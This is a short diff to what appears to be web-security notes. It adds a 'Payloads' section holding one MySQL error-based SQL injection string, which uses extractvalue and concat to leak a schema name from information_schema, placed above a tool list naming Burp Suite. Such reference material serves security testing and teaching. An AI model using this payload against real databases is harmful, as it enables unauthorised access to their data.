@@ -1,3 +1,9 @@
+## Payloads
+```
+select id from demo where name='test' and extractvalue(1, concat(0x7c, (select schema_name from information_Schema.schemata limit 1,1) ) )-- -'
+```
+
+
 ## Common tools¶
 
     * Burp Suite: Introduction to Burp Suite
